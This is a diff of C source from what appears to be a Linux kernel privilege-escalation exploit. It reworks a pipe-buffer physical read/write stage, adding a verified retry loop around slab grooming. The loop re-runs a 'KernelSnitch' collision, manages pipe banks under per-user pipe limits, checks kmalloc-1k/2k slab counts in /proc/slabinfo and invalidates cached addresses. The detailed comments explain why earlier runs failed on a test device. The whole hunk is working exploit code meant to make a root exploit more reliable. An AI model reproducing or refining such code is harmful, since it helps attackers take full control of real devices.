+    rmg_diag("PHYS prepare_pipe_buffer_page -> pipebuf_page_base=%016zx\n",
+             pipebuf_page_base);
+    /* Do NOT bail out on 0 here. The reclaim is unverified - prepare_pipe_buffer_page() hands
+     * back a masked ks->mm_struct whether or not the collision actually freed anything - so a
+     * zero or unusable page is a normal outcome that the verify/retry loop below is there to
+     * absorb. Returning here is what left the route with a single unverified shot. */
   }
 
   uintptr_t proof_addr = page_base + PHYSRW_PROOF_OFF;
@@ -2364,16 +3266,108 @@ int install_pipe_physrw(int fd) {
           (proof64_addr & ~(PAGE_SIZE - 1))) {
     return 0;
   }
-  if (!pipe_reclaim_cache_gate(fd)) {
-    pr_info("phys step cache gate failed slab=%016zx want=%016zx\n",
-            candidate_slab_cache, kmalloc_pipe_cache);
-    return 0;
-  }
+  /* VERIFIED reclaim: re-run the groom until the cache gate actually accepts the page.
+   *
+   * This is the fix for the failure that ended every previous run. prepare_pipe_buffer_page()
+   * is a blind attack: it runs the KernelSnitch collision, takes whatever ks->mm_struct comes
+   * back, masks it to ORDER3_SIZE and returns it, with no check that anything was actually
+   * freed. Measured consequence on RFCWC0G1Z1J: a plausible base (ffffff88c9268000,
+   * ffffffff881a7c0000) whose pages were uniformly FREE - type=ffffffff (PAGEFLAGS_MASK) and
+   * cache10=dead000000000122 (SLUB redzone poison) - so the gate reported 88/88 match=0 and
+   * install_child_root FAILed with gate=0 rd=0 wr=0. The input was wrong, so no amount of gate
+   * logic, cache identification, or read ordering could ever have fixed it.
+   *
+   * The fork avoids this by VERIFYING the reclaim against /proc/slabinfo and retrying when the
+   * slab did not actually drain (05_mm_slab_grooming.c:683 read_reclaim_slabs, :703
+   * wait_for_reclaim_quiet_window, :739 exact_mm_reclaim). We get the same guarantee more
+   * cheaply: pipe_reclaim_cache_gate() is itself the proof, because it only accepts a page
+   * whose slab_cache is a real kmalloc-1k/2k bucket. So loop prepare -> fill -> gate, and treat
+   * a gate rejection as "this reclaim did not take" and try again. Bounded, and on the last
+   * pass we simply fail as before. */
+  const int k_reclaim_verify_passes = 4;
+  int reclaim_gate_ok = 0;
+  for (int pass = 1; pass <= k_reclaim_verify_passes && !reclaim_gate_ok; pass++) {
+    if (pass > 1 || pipebuf_page_base == 0) {
+      pipebuf_pipe_idx = -1;
+      pipebuf_addr = 0;
+      pipe_cache_gate_ok = 0;
+      /* Close the PREVIOUS pass's pipe bank before building the next one.
+       *
+       * This is what keeps us under fs.pipe-user-pages-soft, and getting it wrong silently
+       * invalidates the whole gate. Measured: without this the parent's banks accumulate across
+       * passes - 880 pipes after pass 1, 1760 after pass 2, 2640 after pass 3 - and each full pipe
+       * accounts 16 pages, so the soft limit (16384 pages by default) is crossed at roughly pipe
+       * 1024. Past that point fs/pipe.c:803-806 silently shrinks every new pipe to a ONE-buffer
+       * ring, kcalloc(1, 40) = 40 bytes from kmalloc-64/128, never the 640-byte kmalloc-1k object
+       * the gate looks for. That is precisely why 2640 pipes moved kmalloc-1k active_slabs by
+       * ZERO and why the gate has never once reported match=1.
+       *
+       * reset_pipe_attempt() was already written for exactly this (pipe.c:663) but was only ever
+       * called from fops.c / main.c / slide_app.c between whole attempts, never between reclaim
+       * passes inside install_pipe_physrw(). */
+      if (pass > 1) {
+        reset_pipe_attempt();
+      }
+      pipebuf_page_base = prepare_pipe_buffer_page();
+      rmg_diag("PHYS reclaim pass=%d/%d -> pipebuf_page_base=%016zx\n", pass,
+               k_reclaim_verify_passes, pipebuf_page_base);
+      if (pipebuf_page_base == 0) {
+        rmg_diag("PHYS reclaim pass=%d leaked nothing; retrying\n", pass);
+        continue;
+      }
+    }
+    /* Drive the reclaim pipes before judging the page. Writing to a pipe does not allocate its
+     * ring, so this is not what makes the page live - the alloc_pipe_object() calls inside
+     * prepare_pipe_buffer_page() are - but it matches the fork's order
+     * (09:1491 populate_pipe_markers, then try_pipe_slab_candidates at 1496) and costs nothing. */
+    char marker[PIPE_RECLAIM];
+    memset(marker, 0x61, sizeof(marker));
+    for (size_t i = 0; i < PIPE_RECLAIM; i++) {
+      SYSCHK(write(pipe_fds_reclaim[i][1], marker, i + 1));
+    }
 
-  char marker[PIPE_RECLAIM];
-  memset(marker, 0x61, sizeof(marker));
-  for (size_t i = 0; i < PIPE_RECLAIM; i++) {
-    SYSCHK(write(pipe_fds_reclaim[i][1], marker, i + 1));
+    /* Did the bank actually force slab growth? This is the decisive measurement: a slab is only
+     * built from the buddy when the cache runs out of free objects, so if active_slabs jumped by
+     * roughly the bank size we know pages were really handed out, and if it did not, the bank is
+     * still being served from the per-CPU freelists and the whole premise is wrong. */
+    {
+      long a1 = slabinfo_active_slabs("kmalloc-1k");
+      long a2 = slabinfo_active_slabs("kmalloc-2k");
+      rmg_diag("PIPE post-bank slabs kmalloc-1k active=%ld kmalloc-2k active=%ld "
+               "(bank=%d)\n", a1, a2, (int)PIPE_RECLAIM);
+    }
+
+    if (pipe_reclaim_cache_gate(fd)) {
+      reclaim_gate_ok = 1;
+      rmg_diag("PHYS reclaim pass=%d/%d ACCEPTED page=%016zx idx=%d\n", pass,
+               k_reclaim_verify_passes, pipebuf_page_base, pipe_cache_page_index);
+      break;
+    }
+    pr_info("phys reclaim pass=%d/%d cache gate FAILED slab=%016zx want=%016zx\n", pass,
+            k_reclaim_verify_passes, candidate_slab_cache, kmalloc_pipe_cache);
+    /* The pr_info above carries the decisive slab/want pair but goes to the block-buffered
+     * stdout log, which is LOST on panic and, on a non-panicking pass, is the only place it
+     * appears. Repeat it through rmg_diag, which is fsync'd and survives, so the gate failure
+     * can actually be diagnosed instead of showing up only as a bare "REJECTED". */
+    rmg_diag("PHYS reclaim pass=%d/%d cache gate FAILED slab=%016zx want=%016zx "
+             "slab_cache=%016zx\n", pass, k_reclaim_verify_passes, candidate_slab_cache,
+             kmalloc_pipe_cache, candidate_slab_cache);
+    /* Invalidate the cached base so the next pass does a REAL groom.
+     *
+     * Without this the retry loop is a no-op: prepare_pipe_buffer_page() short-circuits to
+     * rmg_reclaimed_mm_base, so passes 2..4 re-test the identical page and reject it identically
+     * - measured exactly that, all four passes reporting pipebuf_page_base=ffffff88222d0000.
+     * Dropping the cache here restores the loop's whole purpose: first try the cheap base we
+     * already hold, and if the kernel says it is not a live slab page, fall back to launching a
+     * fresh KernelSnitch pass. */
+    rmg_reclaimed_mm_base = 0;
+    rmg_diag("PHYS reclaim pass=%d/%d dropped cached mm base; next pass grooms fresh\n", pass,
+             k_reclaim_verify_passes);
+  }
+  if (!reclaim_gate_ok) {
+    rmg_diag("PHYS reclaim gave up after %d passes; no live kmalloc slab page obtained\n",
+             k_reclaim_verify_passes);
+    return 0;
   }
 
   int found = find_pipe_buffer(fd, pipebuf_page_base);
